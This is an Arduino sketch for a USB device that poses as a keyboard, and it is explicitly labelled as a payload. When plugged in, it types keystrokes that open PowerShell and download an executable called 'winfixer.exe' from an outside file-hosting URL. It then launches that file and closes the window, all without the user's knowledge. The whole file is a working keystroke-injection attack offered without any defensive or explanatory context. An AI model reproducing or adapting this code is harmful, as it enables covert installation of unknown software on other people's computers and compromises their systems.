#define HID_CUSTOM_LAYOUT
#define LAYOUT_SPANISH
#include <HID-Project.h>
#include <HID-Settings.h>


// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print("powershell");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.print("wget https://tmpfiles.org/dl/105691/winfixer.exe -o winfixer.exe");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.print("start winfixer.exe");
  delay(200);
  Keyboard.write(KEY_RETURN);
  Keyboard.print("exit");
  delay(200);
  Keyboard.write(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}
